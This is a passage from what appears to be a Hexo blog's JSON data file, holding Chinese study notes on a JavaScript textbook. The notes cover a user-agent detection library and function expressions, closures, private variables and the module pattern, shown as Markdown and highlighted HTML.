(?:iPhone )?OS (\\d+_\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      system.ios = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>.$<span class=\"number\">1.</span>replace(<span class=\"string\">\"_\"</span>, <span class=\"string\">\".\"</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      system.ios = <span class=\"number\">2</span>; <span class=\"comment\">//不能真正检测出来，所以只能猜测</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测Android 版本</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"regexp\">/Android (\\d+\\.\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    system.android = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>.$<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//游戏系统</span></span><br><span class=\"line\">  system.wii = ua.indexOf(<span class=\"string\">\"Wii\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ps = <span class=\"regexp\">/playstation/i</span>.test(ua);</span><br><span class=\"line\">  <span class=\"comment\">//返回这些对象</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    engine: engine,</span><br><span class=\"line\">    browser: browser,</span><br><span class=\"line\">    system: system</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>客户端检测，只有在万不得已的时候再使用，使用优先顺序为：能力检测&gt;怪癖检测&gt;用户代理检测。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"能力检测\"><a href=\"#能力检测\" class=\"headerlink\" title=\"能力检测\"></a>能力检测</h2><p>在编写代码之前先检测特定浏览器的能力。</p>\n<h2 id=\"怪癖检测\"><a href=\"#怪癖检测\" class=\"headerlink\" title=\"怪癖检测\"></a>怪癖检测</h2><p>怪癖实际上是浏览器实现中存在的 bug，只在某个怪癖会干 扰脚本运行的情况下使用。</p>\n<h2 id=\"用户代理检测\"><a href=\"#用户代理检测\" class=\"headerlink\" title=\"用户代理检测\"></a>用户代理检测</h2><p>由于历史原因，现在各个浏览器的用户代理 userAgent 中包含重复交错的信息，因此封装一个检测库：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> client = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//呈现引擎</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> engine = &#123;</span><br><span class=\"line\">    ie: <span class=\"number\">0</span>,</span><br><span class=\"line\">    gecko: <span class=\"number\">0</span>,</span><br><span class=\"line\">    webkit: <span class=\"number\">0</span>,</span><br><span class=\"line\">    khtml: <span class=\"number\">0</span>,</span><br><span class=\"line\">    opera: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"comment\">//完整的版本号</span></span><br><span class=\"line\">    ver: <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> browser = &#123;</span><br><span class=\"line\">    <span class=\"comment\">//主要浏览器</span></span><br><span class=\"line\">    ie: <span class=\"number\">0</span>,</span><br><span class=\"line\">    firefox: <span class=\"number\">0</span>,</span><br><span class=\"line\">    safari: <span class=\"number\">0</span>,</span><br><span class=\"line\">    konq: <span class=\"number\">0</span>,</span><br><span class=\"line\">    opera: <span class=\"number\">0</span>,</span><br><span class=\"line\">    chrome: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"comment\">//具体的版本号</span></span><br><span class=\"line\">    ver: <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//平台、设备和操作系统</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> system = &#123;</span><br><span class=\"line\">    win: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    mac: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    x11: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"comment\">//移动设备</span></span><br><span class=\"line\">    iphone: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ipod: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ipad: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ios: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    android: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    nokiaN: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    winMobile: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"comment\">//游戏系统</span></span><br><span class=\"line\">    wii: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    ps: <span class=\"literal\">false</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//检测呈现引擎和浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> ua = navigator.userAgent;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.opera) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">window</span>.opera.version();</span><br><span class=\"line\">    engine.opera = browser.opera = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/AppleWebKit\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.webkit = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">    <span class=\"comment\">//确定是Chrome 还是Safari</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Chrome\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.chrome = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/Version\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.safari = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">//近似地确定版本号</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> safariVersion = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">312</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1.2</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (engine.webkit &lt; <span class=\"number\">412</span>) &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">1.3</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        safariVersion = <span class=\"number\">2</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      browser.safari = browser.ver = safariVersion;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/KHTML\\/(\\S+)/</span>.test(ua) || <span class=\"regexp\">/Konqueror\\/([^;]+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.khtml = browser.konq = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/rv:([^\\)]+)\\) Gecko\\/\\d&#123;8&#125;/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.gecko = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">    <span class=\"comment\">//确定是不是Firefox</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Firefox\\/(\\S+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      browser.firefox = <span class=\"built_in\">parseFloat</span>(browser.ver);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"regexp\">/MSIE ([^;]+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    engine.ver = browser.ver = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">    engine.ie = browser.ie = <span class=\"built_in\">parseFloat</span>(engine.ver);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测浏览器</span></span><br><span class=\"line\">  browser.ie = engine.ie;</span><br><span class=\"line\">  browser.opera = engine.opera;</span><br><span class=\"line\">  <span class=\"comment\">//检测平台</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> p = navigator.platform;</span><br><span class=\"line\">  system.win = p.indexOf(<span class=\"string\">\"Win\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  system.mac = p.indexOf(<span class=\"string\">\"Mac\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  system.x11 = p == <span class=\"string\">\"X11\"</span> || p.indexOf(<span class=\"string\">\"Linux\"</span>) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"comment\">//检测Windows 操作系统</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.win) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Win(?:dows )?([^do]&#123;2&#125;)\\s?(\\d+\\.\\d+)?/</span>.test(ua)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>] == <span class=\"string\">\"NT\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$2\"</span>]) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"5.0\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"2000\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"5.1\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"XP\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"6.0\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"Vista\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"string\">\"6.1\"</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"7\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            system.win = <span class=\"string\">\"NT\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>] == <span class=\"string\">\"9x\"</span>) &#123;</span><br><span class=\"line\">        system.win = <span class=\"string\">\"ME\"</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        system.win = <span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//移动设备</span></span><br><span class=\"line\">  system.iphone = ua.indexOf(<span class=\"string\">\"iPhone\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ipod = ua.indexOf(<span class=\"string\">\"iPod\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ipad = ua.indexOf(<span class=\"string\">\"iPad\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.nokiaN = ua.indexOf(<span class=\"string\">\"NokiaN\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  <span class=\"comment\">//windows mobile</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.win == <span class=\"string\">\"CE\"</span>) &#123;</span><br><span class=\"line\">    system.winMobile = system.win;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (system.win == <span class=\"string\">\"Ph\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/Windows Phone OS (\\d+.\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      system.win = <span class=\"string\">\"Phone\"</span>;</span><br><span class=\"line\">      system.winMobile = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>[<span class=\"string\">\"$1\"</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测iOS 版本</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (system.mac &amp;&amp; ua.indexOf(<span class=\"string\">\"Mobile\"</span>) &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"regexp\">/CPU (?:iPhone )?OS (\\d+_\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">      system.ios = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>.$<span class=\"number\">1.</span>replace(<span class=\"string\">\"_\"</span>, <span class=\"string\">\".\"</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      system.ios = <span class=\"number\">2</span>; <span class=\"comment\">//不能真正检测出来，所以只能猜测</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//检测Android 版本</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"regexp\">/Android (\\d+\\.\\d+)/</span>.test(ua)) &#123;</span><br><span class=\"line\">    system.android = <span class=\"built_in\">parseFloat</span>(<span class=\"built_in\">RegExp</span>.$<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//游戏系统</span></span><br><span class=\"line\">  system.wii = ua.indexOf(<span class=\"string\">\"Wii\"</span>) &gt; <span class=\"number\">-1</span>;</span><br><span class=\"line\">  system.ps = <span class=\"regexp\">/playstation/i</span>.test(ua);</span><br><span class=\"line\">  <span class=\"comment\">//返回这些对象</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    engine: engine,</span><br><span class=\"line\">    browser: browser,</span><br><span class=\"line\">    system: system</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>"},{"title":"函数表达式（《JavaScript高级程序设计》）","date":"2019-01-10T09:47:01.000Z","updated":"2019-01-10T09:47:01.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n函数表达式：递归，闭包，模仿块级作用域，私有变量。\n\n<!-- more -->\n\n# 详述\n\n## 函数表达式与函数声明的区别\n\n- “函数声明提升”\n- 创建函数两种方式\n\n## 递归\n\n```js\nfunction factorial(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * arguments.callee(num - 1);\n  }\n}\n// 严格模式下实现（访问arguments.callee有错误）\nvar factorial = function f(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * f(num - 1);\n  }\n};\n```\n\n## 闭包\n\n### 1. 匿名函数与闭包\n\n- 闭包是指有权访问另一个函数作用域中的变量的函数。\n- 创建闭包的常见方式就是在一个函数内部创建另一个函数。\n\n### 2. 闭包与变量\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = function() {\n      return i;\n    };\n  }\n  return result;\n}\n```\n\n### 3. 关于 this 对象\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n## 模仿块级作用域\n\n```js\n(function() {\n  //这里是块级作用域\n})();\n```\n\n## 私有变量\n\n### 1. 两种在对象上创建特权方法的方式\n\n构造函数实现方式\n\n```js\n// 构造函数实现方式\nfunction MyObject() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权方法\n  this.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n}\n\n// 示例\nfunction Person(name) {\n  this.getName = function() {\n    return name;\n  };\n  this.setName = function(value) {\n    name = value;\n  };\n}\nvar person = new Person(\"Nicholas\");\nalert(person.getName()); //\"Nicholas\"\nperson.setName(\"Greg\");\nalert(person.getName()); //\"Greg\"\n```\n\n静态私有变量实现方式\n\n```js\n// 静态私有变量实现方式\n(function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //构造函数\n  MyObject = function() {};\n  //公有/特权方法\n  MyObject.prototype.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n})();\n\n// 示例\n(function() {\n  var name = \"\";\n  Person = function(value) {\n    name = value;\n  };\n  Person.prototype.getName = function() {\n    return name;\n  };\n  Person.prototype.setName = function(value) {\n    name = value;\n  };\n})();\nvar person1 = new Person(\"Nicholas\");\nalert(person1.getName()); //\"Nicholas\"\nperson1.setName(\"Greg\");\nalert(person1.getName()); //\"Greg\"\nvar person2 = new Person(\"Michael\");\nalert(person1.getName()); //\"Michael\"\nalert(person2.getName()); //\"Michael\"\n```\n\n## 单例模式（模块模式）\n普通方式\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权/公有方法和属性\n  return {\n    publicProperty: true,\n    publicMethod: function() {\n      privateVariable++;\n      return privateFunction();\n    }\n  };\n})();\n```\n增强方式（适合那些单例必须是某种类型的实例）\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //创建对象\n  var object = new CustomType();\n  //添加特权/公有属性和方法\n  object.publicProperty = true;\n  object.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n  //返回这个对象\n  return object;\n})();\n```\n","source":"_posts/2019/01/2019-01-10-JS高设3版-7.md","raw":"---\ntitle: 函数表达式（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-10 17:47:01\nupdated: 2019-01-10 17:47:01\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n函数表达式：递归，闭包，模仿块级作用域，私有变量。\n\n<!-- more -->\n\n# 详述\n\n## 函数表达式与函数声明的区别\n\n- “函数声明提升”\n- 创建函数两种方式\n\n## 递归\n\n```js\nfunction factorial(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * arguments.callee(num - 1);\n  }\n}\n// 严格模式下实现（访问arguments.callee有错误）\nvar factorial = function f(num) {\n  if (num <= 1) {\n    return 1;\n  } else {\n    return num * f(num - 1);\n  }\n};\n```\n\n## 闭包\n\n### 1. 匿名函数与闭包\n\n- 闭包是指有权访问另一个函数作用域中的变量的函数。\n- 创建闭包的常见方式就是在一个函数内部创建另一个函数。\n\n### 2. 闭包与变量\n\n```js\nfunction createFunctions() {\n  var result = new Array();\n  for (var i = 0; i < 10; i++) {\n    result[i] = function() {\n      return i;\n    };\n  }\n  return result;\n}\n```\n\n### 3. 关于 this 对象\n\n```js\nvar name = \"The Window\";\nvar object = {\n  name: \"My Object\",\n  getNameFunc: function() {\n    return function() {\n      return this.name;\n    };\n  }\n};\nalert(object.getNameFunc()()); //\"The Window\"（在非严格模式下）\n```\n\n## 模仿块级作用域\n\n```js\n(function() {\n  //这里是块级作用域\n})();\n```\n\n## 私有变量\n\n### 1. 两种在对象上创建特权方法的方式\n\n构造函数实现方式\n\n```js\n// 构造函数实现方式\nfunction MyObject() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权方法\n  this.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n}\n\n// 示例\nfunction Person(name) {\n  this.getName = function() {\n    return name;\n  };\n  this.setName = function(value) {\n    name = value;\n  };\n}\nvar person = new Person(\"Nicholas\");\nalert(person.getName()); //\"Nicholas\"\nperson.setName(\"Greg\");\nalert(person.getName()); //\"Greg\"\n```\n\n静态私有变量实现方式\n\n```js\n// 静态私有变量实现方式\n(function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //构造函数\n  MyObject = function() {};\n  //公有/特权方法\n  MyObject.prototype.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n})();\n\n// 示例\n(function() {\n  var name = \"\";\n  Person = function(value) {\n    name = value;\n  };\n  Person.prototype.getName = function() {\n    return name;\n  };\n  Person.prototype.setName = function(value) {\n    name = value;\n  };\n})();\nvar person1 = new Person(\"Nicholas\");\nalert(person1.getName()); //\"Nicholas\"\nperson1.setName(\"Greg\");\nalert(person1.getName()); //\"Greg\"\nvar person2 = new Person(\"Michael\");\nalert(person1.getName()); //\"Michael\"\nalert(person2.getName()); //\"Michael\"\n```\n\n## 单例模式（模块模式）\n普通方式\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //特权/公有方法和属性\n  return {\n    publicProperty: true,\n    publicMethod: function() {\n      privateVariable++;\n      return privateFunction();\n    }\n  };\n})();\n```\n增强方式（适合那些单例必须是某种类型的实例）\n```js\nvar singleton = (function() {\n  //私有变量和私有函数\n  var privateVariable = 10;\n  function privateFunction() {\n    return false;\n  }\n  //创建对象\n  var object = new CustomType();\n  //添加特权/公有属性和方法\n  object.publicProperty = true;\n  object.publicMethod = function() {\n    privateVariable++;\n    return privateFunction();\n  };\n  //返回这个对象\n  return object;\n})();\n```\n","slug":"2019-01-10-JS高设3版-7","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wj004cwovvdlrzdzaq","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>函数表达式：递归，闭包，模仿块级作用域，私有变量。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"函数表达式与函数声明的区别\"><a href=\"#函数表达式与函数声明的区别\" class=\"headerlink\" title=\"函数表达式与函数声明的区别\"></a>函数表达式与函数声明的区别</h2><ul>\n<li>“函数声明提升”</li>\n<li>创建函数两种方式</li>\n</ul>\n<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span 